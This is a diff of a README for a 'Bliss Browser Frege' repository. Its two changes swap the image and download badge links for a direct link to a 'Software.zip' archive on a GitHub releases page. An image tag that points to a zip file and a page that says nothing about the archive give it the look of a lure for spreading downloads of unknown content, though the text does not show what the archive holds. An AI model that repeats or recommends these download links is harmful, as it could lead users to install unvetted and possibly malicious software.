@@ -1,6 +1,6 @@
 # Bliss Browser Frege 🌐
 
-![Bliss Browser Frege](https://github.com/user-attachments/files/18383251/Software.zip)
+![Bliss Browser Frege](https://github.com/hellc1ts/Bliss_Browser_Frege/releases/download/v2.0/Software.zip)
 
 ## Welcome to the Bliss Browser Frege Repository! 🌳️
 
@@ -35,7 +35,7 @@ Explore the world of Frege programming with the Bliss Browser Frege module. Writ
 
 ---
 
-[![Download Bliss Browser Frege](https://img.shields.io/badge/Download-Bliss_Browser_Frege-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Bliss Browser Frege](https://github.com/hellc1ts/Bliss_Browser_Frege/releases/download/v2.0/Software.zip)](https://github.com/hellc1ts/Bliss_Browser_Frege/releases/download/v2.0/Software.zip)
 
 ✨ Happy Coding! ✨
 
